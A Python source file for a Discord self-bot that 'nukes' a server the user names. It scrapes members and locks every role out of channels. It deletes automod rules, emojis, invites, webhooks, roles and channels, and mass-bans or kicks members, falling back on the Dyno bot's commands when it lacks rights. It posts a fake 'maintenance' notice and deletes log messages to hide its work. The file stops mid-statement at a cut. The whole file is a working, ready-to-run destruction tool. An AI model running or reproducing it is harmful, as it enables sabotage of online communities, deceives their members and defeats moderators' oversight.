import asyncio
import datetime
from datetime import timedelta
import discord
import sys
import re
import os
import json
from discord.ext import commands

bot = commands.Bot(command_prefix="?", self_bot=True)
script_dir = os.path.dirname(os.path.abspath(__file__))

if sys.platform == 'win32':  # weird fix for a bug I ran into
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

guild_nuke_id = input("Input the Guild ID that will be nuked: ")
if not guild_nuke_id.strip().isnumeric():
    print("Invalid Guild ID: Non numeric input.")
    quit()
auto_delete_logs_channel_id = input("ID of log channel to delete new messages (type a letter if there is none): ")
if not auto_delete_logs_channel_id.strip().isnumeric():
    print("Log channel ID isn't valid. Moving forward assuming there is none.")
    auto_delete_logs_channel_id = None
dyno_prefix = input("Input the dyno bot prefix: ").strip()
print(f"Using Dyno bot commands with prefix: {dyno_prefix}")
ratelimit_question = input("Wait between commands? [Y/n]: ")
print("HIGHLY recommend using a json file for getting members: see my other github project for a scraper.")
print("It takes hours to fully scrape a big server for its members. I recommend scrapping it fully before running "
      "this bot.")
fetch_question = input("Get members from a .json file? [Y/n]: ")
avoid_ratelimit = False
fetch_json = False
if ratelimit_question.lower().startswith("y"): avoid_ratelimit = True
if fetch_question.lower().startswith("y"): fetch_json = True


async def parse_input(user_input: str):
    prompt = user_input.strip()
    if not prompt.isnumeric():
        print("Invalid guild ID passed. Restart the script.")
        return
    guild = None
    try:
        guild = await bot.fetch_guild(int(prompt))
    except discord.Forbidden:
        print("Failed to fetch the guild: No access to the Guild.")
        return
    except discord.HTTPException:
        print("Failed to fetch the guild: HTTP Exception.")
        return
    if guild:
        print(f"Nuking guild {guild.name}")
        await nuke(guild=guild)


async def delete_bot_message(channel: discord.abc.GuildChannel):
    if not channel.permissions_for(channel.guild.me).manage_messages or channel.id == auto_delete_logs_channel_id:
        return
    async for message in channel.history(limit=None):
        if message.author.bot:
            try:
                await message.delete()
            except discord.Forbidden:
                print(f"Failed to delete message in {message.channel.name}: Forbidden.")
            except discord.NotFound:
                print(f"Failed to delete message in {message.channel.name}: Not Found.")
            except discord.HTTPException:
                print(f"Failed to delete message in {message.channel.name}: HTTPException.")
            return


async def nuke(guild: discord.Guild):
    print(f"{guild.name} nuke called")
    user_id = bot.user.id
    member = await guild.fetch_member(user_id)
    guild_perms = member.guild_permissions
    is_admin = False
    if guild_perms.administrator: is_admin = True

    # get the user's top role
    top_role = guild.default_role
    for role in member.roles:
        if role > top_role: top_role = role
    print(f"Top role: {top_role.name}")
    channels = None
    try:
        channels = await guild.fetch_channels()
    except discord.InvalidData:
        print("Failed to Fetch Guild Channels: Invalid Data.")
    except discord.HTTPException:
        print("Failed to Fetch Guild Channels: HTTPException.")

    guild_members = []
    if fetch_json:
        if not os.path.exists(f"{guild.id}.json"):
            print(f"Missing the json file: /{guild.id}.json")
            quit()
        with open(f"{guild.id}.json", 'r') as file:
            data = json.load(file)
        guild_members = data['user-ids']
        print(f"Found the member list file: {len(guild_members)} IDs found!")

    #  ----  Fetching every user's ID  ----  #

    if not fetch_json:
        print("Trying to fetch all guild member's ids.")
        print("Without kick/ban or manage role permissions it will have to scrape the sidebar.")
        print("In large severs the sidebar does not show offline members, so it might not fetch all members.")
        print("This may take a while.")

        good_channels_for_member_scraping = []
        channel_ratings = {}
        if channels:
            for x in channels:
                if not x.permissions_for(member).read_messages: continue
                roles_seeing_channel_count = 0
                for role in guild.roles:
                    if x.permissions_for(role).read_messages: roles_seeing_channel_count += 1
                channel_ratings[f'{x.id}'] = roles_seeing_channel_count

        sorted_channels = sorted(channel_ratings.items(), key=lambda item: item[1], reverse=True)

        # Append the top 5 channels to the list
        for channel_id, count in sorted_channels[:5]:
            append_channel = await guild.fetch_channel(channel_id)
            good_channels_for_member_scraping.append(append_channel)

        print(f"is guild {guild.large}")
        if guild_perms.kick_members or guild_perms.ban_members or guild_perms.manage_roles or is_admin:
            if len(good_channels_for_member_scraping) > 1:
                members = await guild.fetch_members(force_scraping=False, channels=good_channels_for_member_scraping)
                for x in members:
                    if x.id == bot.user.id:
                        members.remove(x)
                        continue
                    if x.status is not discord.Status.offline:
                        guild_members.append(x)
                        members.remove(x)
                for x in members:
                    guild_members.append(x)
                    members.remove(x)
            else:
                print("No Valid Channels found for scraping.")
        else:
            if guild.member_count < 250:
                if len(good_channels_for_member_scraping) > 1:
                    members = await guild.fetch_members(channels=good_channels_for_member_scraping, force_scraping=True,
                                                        delay=.1)
                    for x in members:
                        if x.id == bot.user.id:
                            members.remove(x)
                            continue
                        if x.status is not discord.Status.offline:
                            guild_members.append(x)
                            members.remove(x)
                    for x in members:
                        guild_members.append(x)
                        members.remove(x)
                else:
                    print("No Valid Channels found for scraping.")
            else:
                print("Guild is >250 members, the script will now scrape message history, checking if accounts that sent "
                      "messages share this guild with you. This will probably take a while")
                if len(good_channels_for_member_scraping) > 0:
                    members = await guild.fetch_members(channels=good_channels_for_member_scraping, force_scraping=True,
                                                        delay=.1, cache=True)
                    for x in members:
                        if x.id == bot.user.id:
                            members.remove(x)
                            continue
                        if x.status is not discord.Status.offline:
                            guild_members.append(x)
                            members.remove(x)
                    for x in members:
                        guild_members.append(x)
                        members.remove(x)
                channels_to_scrape = []
                new_channels = await guild.fetch_channels()
                tep = []
                for x in new_channels:
                    try:
                        tip = await guild.fetch_channel(x.id)
                        print(f"Fetching channel {tip.name}")
                        tep.append(tip)
                    except discord.Forbidden:
                        print(f"Failed to fetch channel {x.name}: Forbidden")

                print(f"Fetched guild channels length: {len(tep)}")
                if len(tep) > len(channels): channels = tep

                for channel_curr in tep:
                    if channel_curr.type is discord.ChannelType.category: continue
                    if channel_curr.type is discord.ChannelType.forum:
                        if channel_curr.permissions_for(guild.me).read_messages:
                            try:
                                async for thread in channel_curr.archived_threads(limit=None):
                                    channels_to_scrape.append(thread)
                            except discord.Forbidden:
                                print("Failed to check channel threads: Forbidden.")
                            except discord.HTTPException:
                                print("Failed to check channel threads: HTTPException")
                            for thread in channel_curr.threads:
                                channels_to_scrape.append(thread)
                    elif channel_curr.type is discord.ChannelType.text:
                        if channel_curr.permissions_for(guild.me).read_messages:
                            channels_to_scrape.append(channel_curr)
                            try:
                                async for thread in channel_curr.archived_threads(limit=None):
                                    channels_to_scrape.append(thread)
                            except discord.Forbidden:
                                print("Failed to check channel threads: Forbidden.")
                            except discord.HTTPException:
                                print("Failed to check channel threads: HTTPException")
                            for thread in channel_curr.threads:
                                channels_to_scrape.append(thread)
                    elif channel_curr.type is discord.ChannelType.stage_voice or channel_curr.type is discord.ChannelType.voice:
                        if channel_curr.permissions_for(guild.me).read_messages:
                            channels_to_scrape.append(channel_curr)
                print(f"channels to scrape: {len(channels_to_scrape)}")
                not_in_guild = []
                for x in channels_to_scrape:
                    print(f"Scraping channel {x.name} for members.")
                    async for message in x.history(limit=None):
                        if message.author in guild_members: continue
                        if message.author.id in not_in_guild: continue
                        try:
                            message_user = await guild.fetch_member(message.author.id)
                            if message_user in guild_members:
                                print("late continue")
                                continue
                            print(f"New member added: {message_user.name} | Count: {len(guild_members) + 1}")
                            guild_members.append(message_user)
                        except discord.NotFound:
                            not_in_guild.append(message.author.id)
                        except discord.Forbidden:
                            print("Failed to fetch user: Forbidden.")
                        except discord.HTTPException:
                            print("Failed to fetch user: HTTPException.")
        print(f"Members scraped: {len(guild_members)}")

    #  ----  Channel Permission Denial  ----  #

    print("Trying to deny message/read permissions on all channels.")

    for category in guild.categories:
        category_perms = category.permissions_for(member)
        if category_perms.manage_permissions or is_admin:
            for role in guild.roles:
                if role < top_role or guild.owner_id == bot.user.id:
                    if len(role.members) < 1: continue
                    if not category.permissions_for(role).read_messages and not category.permissions_for(role). \
                            send_messages: continue
                    overwrite = category.overwrites.get(role)
                    if not overwrite: overwrite = discord.PermissionOverwrite()
                    overwrite.update(**{"send_messages": False, "read_messages": False})
                    await category.set_permissions(role, overwrite=overwrite)
    for channel in guild.channels:
        if not channel.category: continue
        channel_perms = channel.permissions_for(member)
        if channel_perms.manage_permissions or is_admin:
            for role in guild.roles:
                if role < top_role or guild.owner_id == bot.user.id:
                    if len(role.members) < 1: continue
                    if not channel.permissions_for(role).read_messages and not channel.permissions_for(role). \
                            send_messages: continue
                    overwrite = channel.overwrites.get(role)
                    if not overwrite: overwrite = discord.PermissionOverwrite()
                    overwrite.update(**{"send_messages": False, "read_messages": False})
                    await channel.set_permissions(role, overwrite=overwrite)

    # Non-cache based channel iteration
    if len(guild.channels) < 1:
        for channel in channels:
            channel_perms = channel.permissions_for(member)
            if channel_perms.manage_permissions or is_admin:
                for role in guild.roles:
                    if role < top_role or guild.owner_id == bot.user.id:
                        if len(role.members) < 1: continue
                        if not channel.permissions_for(role).read_messages and not channel.permissions_for(role). \
                                send_messages: continue
                        overwrite = channel.overwrites.get(role)
                        if not overwrite: overwrite = discord.PermissionOverwrite()
                        overwrite.update(**{"send_messages": False, "read_messages": False})
                        await channel.set_permissions(role, overwrite=overwrite)

    #  ----  Automod Rule Deletion & Blocking all Messages  ----  #

    if guild_perms.manage_guild or is_admin:
        print("Deleting Automod Rules")
        rules = None
        already_blocking = False
        try:
            rules = await guild.automod_rules()
        except discord.Forbidden:
            print("Failed to fetch Automod rules: Forbidden.")
        except discord.NotFound:
            print("Failed to fetch Automod rules: Not Found.")
        except discord.HTTPException:
            print("Failed to fetch Automod Rules: HTTPException.")
        if rules:
            for rule in rules:
                if rule.trigger.type is discord.AutoModRuleTriggerType.keyword:
                    for x in rule.trigger.regex_patterns:
                        print(x)
                        if x == "^.*$":
                            print("There is already an Automod Rule blocking all messages.")
                            already_blocking = True
                            if not rule.enabled:
                                print("Blocking Rule was disabled, enabling it.")
                                await rule.edit(enabled=True)
                            continue
                try:
                    await rule.delete()
                except discord.Forbidden:
                    print(f"Failed to delete Automod Rule: Forbidden.")
                except discord.NotFound:
                    print(f"Failed to delete Automod Rule: Not Found.")
                except discord.HTTPException:
                    print(f"Failed to delete Automod Rule: HTTPException.")

        if not already_blocking:
            automod_rule_action = discord.AutoModRuleAction()
            automod_rule_action.type = discord.AutoModRuleActionType.timeout
            one_day = timedelta(days=1)
            automod_rule_action.duration = one_day

            automod_rule_block_action = discord.AutoModRuleAction(
                custom_message="Server is down for maintenance, Work will be done soon.")

            automod_rule_trigger = discord.AutoModTrigger(type=discord.AutoModRuleTriggerType.keyword,
                                                          regex_patterns=["^.*$"])
            print("Blocking messages with an Automod rule")
            try:
                await guild.create_automod_rule(name="Block Messages",
                                                event_type=discord.AutoModRuleTriggerType.keyword,
                                                actions=[automod_rule_action, automod_rule_block_action], enabled=True,
                                                trigger=automod_rule_trigger)
            except discord.Forbidden:
                print("Failed to make Automod Rule: Forbidden.")
            except discord.HTTPException:
                print("Failed to make Automod rule: HTTPException.")
        else:
            print("There is already a blocking Automod rule.")

    #  ----  Emojis & Stickers Deletion  ----  #

    if guild_perms.manage_emojis_and_stickers or is_admin:
        print("Deleting Stickers")
        stickers = None
        try:
            stickers = await guild.fetch_stickers()
        except discord.HTTPException:
            print("Failed to fetch stickers.")
        if stickers:
            for x in stickers:
                try:
                    await x.delete()
                except discord.Forbidden:
                    print(f"Failed to delete sticker {x.name}: Forbidden.")
                except discord.HTTPException:
                    print(f"Failed to delete sticker {x.name}: HTTPException.")

        print("Deleting Emojis")
        emojis = None
        try:
            emojis = await guild.fetch_emojis()
        except discord.HTTPException:
            print("Couldn't fetch emojis: HTTPException.")
        if emojis:
            for x in emojis:
                try:
                    await x.delete()
                except discord.Forbidden:
                    print(f"Couldn't delete emoji {x.name}: Forbidden.")
                except discord.HTTPException:
                    print(f"Couldn't delete emoji {x.name}: HTTPException")

    #  ----  Invites & Templates Deletion  ----  #

    if guild_perms.manage_guild or is_admin:
        print("Deleting invites")
        invites = None
        try:
            invites = await guild.invites()
        except discord.Forbidden:
            print(f"Couldn't fetch invites: Forbidden.")
        except discord.HTTPException:
            print(f"Couldn't fetch templates: HTTPException.")
        if invites:
            for x in invites:
                try:
                    await x.delete()
                except discord.Forbidden:
                    print("Couldn't delete invite: Forbidden.")
                except discord.NotFound:
                    print(f"Couldn't delete invite: Not Found.")
                except discord.HTTPException:
                    print("Couldn't delete invite: HTTPException.")

        print("Deleting Templates")
        templates = None
        try:
            templates = await guild.templates()
        except discord.Forbidden:
            print(f"Couldn't fetch templates: Forbidden.")
        if templates:
            for x in templates:
                try:
                    await x.delete()
                except discord.Forbidden:
                    print(f"Couldn't delete template: Forbidden.")
                except discord.NotFound:
                    print(f"Couldn't delete template: Not Found.")
                except discord.HTTPException:
                    print(f"Couldn't delete template: HTTPException.")

    #  ----  Webhooks Deletion  ----  #

    if guild_perms.manage_webhooks or is_admin:
        print("Deleting Webhooks")
        webhooks = None
        try:
            webhooks = await guild.webhooks()
        except discord.Forbidden:
            print("Couldn't fetch webhooks.")
        if webhooks:
            for x in webhooks:
                try:
                    await x.delete()
                except discord.NotFound:
                    print(f"Webhook {x.name} not found, continuing.")
                except discord.Forbidden:
                    print(f"Couldn't delete webhook {x.name}: Forbidden")
                except discord.HTTPException:
                    print(f"Failed to delete webhook {x.name}.")

    #  ----  Prune Members  ----  #

    if guild_perms.kick_members or is_admin:
        pruneable_roles = []
        for x in guild.roles:  # Can only prune lower roles
            if x < top_role or guild.owner_id == bot.user.id: pruneable_roles.append(x)
        try:
            pruneable_count = await guild.estimate_pruned_members(days=1, roles=pruneable_roles)
        except discord.Forbidden:
            print("Don't have permissions to prune.")
            pruneable_count = None
        except discord.HTTPException:
            print("Failed to prune members.")
            pruneable_count = None
        if pruneable_count:
            print("Pruning members with >1 day of inactivity")
            try:
                pruned_count = await guild.prune_members(days=1, roles=pruneable_roles)
                print(f"Pruned {pruned_count} members.")
            except discord.Forbidden:
                print("Don't have permissions to prune.")
            except discord.HTTPException:
                print("Failed to prune members.")

    #  ----  Mass Kick/Ban  ----  #

    print("Trying to kick/ban everyone with inbuilt methods.")

    kicked_members = []  # used to go back and ban them if possible
    ban_command = None
    kick_command = None
    delete_role_command = None
    plain_text_ban = False
    plain_text_kick = False
    plain_text_delete_role = False
    possible_channel = None
    if guild_perms.kick_members and not guild_perms.ban_members and not is_admin:
        print("User just has kick perms.")
        for u in guild_members:
            if fetch_json:
                try:
                    x = await guild.fetch_member(u)
                except discord.NotFound:
                    guild_members.remove(u)
                    continue
                except discord.Forbidden:
                    guild_members.remove(u)
                    continue
                except discord.HTTPException:
                    guild_members.remove(u)
                    continue
                except Exception as e:
                    print(f"Failed to find user from json: {e}")
                    guild_members.remove(u)
                    continue
            else: x = u
            if x.top_role < top_role or guild.owner_id == bot.user.id:
                try:
                    await x.kick()
                    if fetch_json:
                        guild_members.remove(u)
                    else:
                        guild_members.remove(x)
                    if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(3)
                except discord.Forbidden:
                    print(f"Failed to kick member {x.name}, id: {x.id}")
                except Exception as e:
                    print(e)
            else:
                if fetch_json:
                    guild_members.remove(u)
                else:
                    guild_members.remove(x)
    elif guild_perms.ban_members and not guild_perms.kick_members and not is_admin:
        print("User just has ban perms.")
        for u in guild_members:
            if fetch_json:
                try:
                    x = await guild.fetch_member(u)
                except discord.NotFound:
                    guild_members.remove(u)
                    continue
                except discord.Forbidden:
                    guild_members.remove(u)
                    continue
                except discord.HTTPException:
                    guild_members.remove(u)
                    continue
                except Exception as e:
                    print(f"Failed to find user from json: {e}")
                    guild_members.remove(u)
                    continue
            else: x = u
            if x.top_role < top_role or guild.owner_id == bot.user.id:
                try:
                    await x.ban()
                    if fetch_json:
                        guild_members.remove(u)
                    else:
                        guild_members.remove(x)
                    if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(3)
                except discord.NotFound:
                    print(f"Failed to ban member: The requested user was not found: {x.name} id: {x.id}")
                    if fetch_json:
                        guild_members.remove(u)
                    else:
                        guild_members.remove(x)
                except discord.Forbidden:
                    print(f"Failed to ban member {x.name}, id: {x.id}: Forbidden")
                    if fetch_json:
                        guild_members.remove(u)
                    else:
                        guild_members.remove(x)
                except Exception as e:
                    if fetch_json:
                        guild_members.remove(u)
                    else:
                        guild_members.remove(x)
                    print(e)
            else:
                if fetch_json:
                    guild_members.remove(u)
                else:
                    guild_members.remove(x)
    elif guild_perms.ban_members and guild_perms.kick_members or is_admin:
        print("Use has both ban and kick perms. Or has admin.")
        ban_turn = True
        for u in guild_members:
            if fetch_json:
                try:
                    x = await guild.fetch_member(u)
                except discord.NotFound:
                    guild_members.remove(u)
                    continue
                except discord.Forbidden:
                    guild_members.remove(u)
                    continue
                except discord.HTTPException:
                    guild_members.remove(u)
                    continue
                except Exception as e:
                    print(f"Failed to find user from json: {e}")
                    guild_members.remove(u)
                    continue
            else: x = u
            if ban_turn:
                print(f"trying to ban: {x.name}")
            else:
                print(f"trying to kick: {x.name}")
            if x.top_role < top_role or guild.owner_id == bot.user.id:
                if ban_turn:
                    ban_turn = False
                    try:
                        await x.ban()
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(1.5)
                    except discord.NotFound:
                        print(f"Failed to ban member: The requested user was not found: {x.name} id: {x.id}")
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to ban member {x.name}, id: {x.id}")
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                    except Exception as e:
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                        print(e)
                else:
                    ban_turn = True
                    kicked_members.append(x)  # assumes that the user will be banned, regardless if the kick works
                    try:
                        await x.kick()
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(1.5)
                    except discord.Forbidden:
                        print(f"Failed to kick member {x.name}, id: {x.id}")
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                    except Exception as e:
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                        print(e)
            else:
                if fetch_json:
                    guild_members.remove(u)
                else:
                    guild_members.remove(x)
    elif not guild_perms.kick_members and not guild_perms.ban_members and not is_admin:
        print("User has no kick or ban perms. And no admin.")
        print("Trying to kick/ban everyone with a bot.")

        #  Trying to find the lowest channel, with a preference for voice channels
        if channels:
            for x in channels:
                if x.type is discord.ChannelType.category or x.type is discord.ChannelType.forum: continue
                if not x.permissions_for(member).use_application_commands or not x.permissions_for(member).read_messages \
                        or not x.permissions_for(member).send_messages:
                    continue
                possible_channel = x  # Uses the lowest voice channel

        if not possible_channel:  # Uses the lowest text channel
            for x in channels:
                if not x.permissions_for(member).use_application_commands or not x.permissions_for(
                        member).read_messages or not x.permissions_for(member).send_messages:
                    continue
                possible_channel = x

        print(possible_channel)
        possible_channel = await bot.fetch_channel(possible_channel.id)
        print("Trying to locate bots.")

        guild_commands = await possible_channel.application_commands()
        for x in guild_commands:
            if x.type is not discord.ApplicationCommandType.chat_input: continue

            if x.name.lower() == "kick" and x.application.name.lower() == "dyno":
                print("Dyno kick perms")
                kick_command = x
                continue
            if x.name.lower() == "ban" and x.application.name.lower() == "dyno":
                print("Dyno ban perms")
                ban_command = x
            if x.name.lower() == "delrole" and x.application.name.lower() == "dyno":
                print("Dyno delete role perms")
                delete_role_command = x

        for u in guild_members:
            if fetch_json:
                try:
                    x = await guild.fetch_member(u)
                except discord.NotFound:
                    guild_members.remove(u)
                    continue
                except discord.Forbidden:
                    guild_members.remove(u)
                    continue
                except discord.HTTPException:
                    guild_members.remove(u)
                    continue
                except Exception as e:
                    print(f"Failed to find user from json: {e}")
                    guild_members.remove(u)
                    continue
            else: x = u

            print(f"{len(guild_members)} iterating over: {u}")
            if ban_command:
                if ban_command.application.name.lower() == x.name.lower():
                    if fetch_json: guild_members.remove(u)
                    else: guild_members.remove(x)
                    continue
            elif kick_command:
                if kick_command.application.name.lower() == x.name.lower():
                    if fetch_json: guild_members.remove(u)
                    else: guild_members.remove(x)
                    continue
            if ban_command:
                for uy in guild_members:
                    if fetch_json:
                        try:
                            x = await guild.fetch_member(uy)
                        except discord.NotFound:
                            guild_members.remove(uy)
                            continue
                        except discord.Forbidden:
                            guild_members.remove(uy)
                            continue
                        except discord.HTTPException:
                            guild_members.remove(uy)
                            continue
                        except Exception as e:
                            print(f"Failed to find user from json: {e}")
                            guild_members.remove(u)
                            continue
                    else:
                        x = uy
                    if x.top_role < top_role or guild.owner_id == bot.user.id:
                        try:
                            print(f"Trying to ban {x.name} via Dyno bot.")
                            options = {
                                "user": x,
                                "no_appeal": True
                            }
                            if not plain_text_ban:
                                await ban_command.__call__(channel=possible_channel, **options)
                                await delete_bot_message(channel=possible_channel)
                            else:
                                await possible_channel.send(content=f"{dyno_prefix}ban {x.id}", delete_after=1)
                                await delete_bot_message(channel=possible_channel)
                            if fetch_json:
                                guild_members.remove(uy)
                            else:
                                guild_members.remove(x)
                            await asyncio.sleep(3)
                        except discord.ext.commands.errors.CommandNotFound:
                            print("Ban Slash command not found, opting for plaintext command.")
                            plain_text_ban = True
                            break
                        except discord.NotFound:
                            print(f"Failed to dyno ban member: The requested user was not found: {x.name} id: {x.id}")
                            if fetch_json:
                                guild_members.remove(uy)
                            else:
                                guild_members.remove(x)
                        except discord.Forbidden:
                            print(f"Failed to dyno ban member {x.name}, id: {x.id}")
                            guild_members.remove(x)
                        except Exception as e:
                            if x in guild_members:
                                if fetch_json:
                                    guild_members.remove(uy)
                                else:
                                    guild_members.remove(x)
                            print(e)
                    else:
                        if fetch_json:
                            guild_members.remove(uy)
                        else:
                            guild_members.remove(x)
            elif kick_command:
                if x.top_role < top_role or guild.owner_id == bot.user.id:
                    try:
                        print(f"Trying to kick {x.name} via Dyno bot.")
                        if not plain_text_kick:
                            await kick_command.__call__(channel=possible_channel, user=x)
                            await delete_bot_message(channel=possible_channel)
                        else:
                            await possible_channel.send(content=f"{dyno_prefix}kick {x.id}", delete_after=1)
                            await delete_bot_message(channel=possible_channel)
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                        await asyncio.sleep(4)
                    except discord.ext.commands.errors.CommandNotFound:
                        print("Kick Slash command not found, opting for plaintext command.")
                        plain_text_kick = True
                        break
                    except discord.NotFound:
                        print(f"Failed to dyno kick member: The requested user was not found: {x.name} id: {x.id}")
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to dyno kick member {x.name}, id: {x.id}")
                        if fetch_json:
                            guild_members.remove(u)
                        else:
                            guild_members.remove(x)
                    except Exception as e:
                        if x in guild_members:
                            if fetch_json:
                                guild_members.remove(u)
                            else:
                                guild_members.remove(x)
                        print(e)
                else:
                    if fetch_json:
                        guild_members.remove(u)
                    else:
                        guild_members.remove(x)
        if plain_text_ban:
            for ua in guild_members:
                if fetch_json:
                    try:
                        x = await guild.fetch_member(ua)
                    except discord.NotFound:
                        guild_members.remove(ua)
                        continue
                    except discord.Forbidden:
                        guild_members.remove(ua)
                        continue
                    except discord.HTTPException:
                        guild_members.remove(ua)
                        continue
                    except Exception as e:
                        print(f"Failed to find user from json: {e}")
                        guild_members.remove(ua)
                        continue
                else:
                    x = ua
                if x.top_role < top_role or guild.owner_id == bot.user.id:
                    try:
                        print(f"Trying to ban {x.name} via Dyno bot.")
                        options = {
                            "user": x,
                            "no_appeal": True
                        }
                        if not plain_text_ban:
                            await ban_command.__call__(channel=possible_channel, **options)
                            await delete_bot_message(channel=possible_channel)
                        else:
                            await possible_channel.send(content=f"{dyno_prefix}ban {x.id}", delete_after=1)
                            await delete_bot_message(channel=possible_channel)
                        guild_members.remove(x)
                        await asyncio.sleep(3)
                    except discord.ext.commands.errors.CommandNotFound:
                        print("Ban Slash command not found, opting for plaintext command.")
                        plain_text_ban = True
                    except discord.NotFound:
                        print(f"Failed to dyno ban member: The requested user was not found: {x.name} id: {x.id}")
                        guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to dyno ban member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        if x in guild_members:
                            guild_members.remove(x)
                        print(e)
                else:
                    guild_members.remove(x)
        if plain_text_kick:
            for ua in guild_members:
                if fetch_json:
                    try:
                        x = await guild.fetch_member(ua)
                    except discord.NotFound:
                        guild_members.remove(ua)
                        continue
                    except discord.Forbidden:
                        guild_members.remove(ua)
                        continue
                    except discord.HTTPException:
                        guild_members.remove(ua)
                        continue
                    except Exception as e:
                        print(f"Failed to find user from json: {e}")
                        guild_members.remove(ua)
                        continue
                else:
                    x = ua
                if x.top_role < top_role or guild.owner_id == bot.user.id:
                    try:
                        print(f"Trying to kick {x.name} via Dyno bot.")
                        if not plain_text_kick:
                            await kick_command.__call__(channel=possible_channel, user=x)
                            await delete_bot_message(channel=possible_channel)
                        else:
                            await possible_channel.send(content=f"{dyno_prefix}kick {x.id}", delete_after=1)
                            await delete_bot_message(channel=possible_channel)
                        guild_members.remove(x)
                        await asyncio.sleep(4)
                    except discord.ext.commands.errors.CommandNotFound:
                        print("Kick Slash command not found, opting for plaintext command.")
                        plain_text_kick = True
                    except discord.NotFound:
                        print(f"Failed to dyno kick member: The requested user was not found: {x.name} id: {x.id}")
                        guild_members.remove(x)
                    except discord.Forbidden:
                        print(f"Failed to dyno kick member {x.name}, id: {x.id}")
                        guild_members.remove(x)
                    except Exception as e:
                        if x in guild_members:
                            guild_members.remove(x)
                        print(e)
                else:
                    guild_members.remove(x)

    #  ----  Role Deletion  ----  #

    if guild_perms.manage_roles or is_admin:
        print("Deleting Roles")
        guild_roles = await guild.fetch_roles()
        for x in guild_roles:
            if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                continue
            if x > top_role and guild.owner_id != bot.user.id: continue
            try:
                await x.delete()
                if avoid_ratelimit: await asyncio.sleep(2)
            except discord.Forbidden:
                print(f"Forbidden: Failed to delete role: {x.name}")
            except discord.HTTPException:
                print(f"HTTP Exception: Failed to delete role: {x.name}")
            except Exception as e:
                print(f"{e}: Failed to delete role: {x.name}")
    elif not guild_perms.manage_roles and not is_admin:
        if delete_role_command:
            print("Insufficient perms: Trying to delete roles with a bot.")
            guild_roles = await guild.fetch_roles()
            for x in guild_roles:
                if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                    continue
                if x > top_role and guild.owner_id != bot.user.id: continue
                try:
                    if not plain_text_delete_role:
                        await x.delete()
                    else:
                        await possible_channel.send(content=f"{dyno_prefix}delrole {x.id}", delete_after=3)
                        await delete_bot_message(channel=possible_channel)
                    if avoid_ratelimit: await asyncio.sleep(4)
                except discord.ext.commands.errors.CommandNotFound:
                    print("Delrole Slash command not found, opting for plaintext command.")
                    plain_text_delete_role = True
                    break
                except discord.Forbidden:
                    print(f"Forbidden: Failed to delete role: {x.name}")
                    plain_text_delete_role = True
                    break
                except discord.HTTPException:
                    print(f"HTTP Exception: Failed to delete role: {x.name}")
                except Exception as e:
                    print(f"{e}: Failed to delete role: {x.name}")
            if plain_text_delete_role:
                print("Trying plaintext dyno command")
                for x in guild_roles:
                    if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                        continue
                    if x > top_role and guild.owner_id != bot.user.id: continue
                    try:
                        await possible_channel.send(content=f"{dyno_prefix}delrole {x.id}", delete_after=1)
                        await delete_bot_message(channel=possible_channel)
                        if avoid_ratelimit: await asyncio.sleep(4)
                    except discord.Forbidden:
                        print(f"Forbidden: Failed to delete role: {x.name}")
                    except discord.HTTPException:
                        print(f"HTTP Exception: Failed to dyno delete role: {x.name}")
                    except Exception as e:
                        print(f"{e}: Failed to dyno delete role: {x.name}")

    #  ----  Channel Deletion  ----  #

    if guild_perms.manage_channels or is_admin:
        print("Deleting Channels")
        for channel in channels:
            if is_admin or channel.permissions_for(member).manage_channels:
                try:
                    await channel.delete()
                    if avoid_ratelimit: await asyncio.sleep(1)
                except discord.NotFound:
                    print(f"Channel {channel.name} not found, continuing")
                except discord.Forbidden:
                    print(f"Cannot delete channel {channel.name}: Forbidden")
                except discord.HTTPException:
                    print(f"Failed to Delete channel {channel.name}")

    #  ----  Banning Kicked Users  ----  #

    if guild_perms.ban_members or is_admin:
        if len(kicked_members) > 0:
            print("Going back and banning kicked users")
            for x in kicked_members:
                print(f"Banning {x.name}")
                try:
                    await x.ban()
                    kicked_members.remove(x)
                    if len(kicked_members) > 0 and avoid_ratelimit: await asyncio.sleep(3)
                except discord.NotFound:
                    print(f"Failed to ban {x.name}: User not found.")
                except discord.Forbidden:
                    print(f"Failed to ban {x.name}: Improper Permissions.")
                except discord.HTTPException:
                    print(f"Failed to ban {x.name}: HTTP Exception, Banning Failed.")

    #  ---- Template Syncing  ----  #

    if guild_perms.manage_guild or is_admin:
        templates = None
        try:
            templates = await guild.templates()
        except discord.Forbidden:
            print("Couldn't Fetch Templates: Forbidden.")
        except discord.HTTPException:
            print("Failed to Fetch Templates: HTTPException.")
        if templates:
            for x in templates:
                try:
                    await x.sync()
                except discord.NotFound:
                    print("Failed to Sync Template: Not Found.")
                except discord.Forbidden:
                    print("Failed to Sync Template: Forbidden.")
                except discord.HTTPException:
                    print("Failed to Sync Template: HTTPException.")

    print("End of Nuke.")
    print("Restart if the bot missed any members.")


@bot.event  # Login event run
async def on_ready():
    print(f"Logged in as user {bot.user.name} is in {len(bot.guilds)} guilds.")
    print("This is a logging only console: You cannot use commands here.")
    await parse_input(guild_nuke_id)


@bot.event
async def on_message(message: discord.Message):
    if not auto_delete_logs_channel_id: return
    if not message.author.bot: return
    if not message.channel.permissions_for(message.guild.me).manage_messages and not \
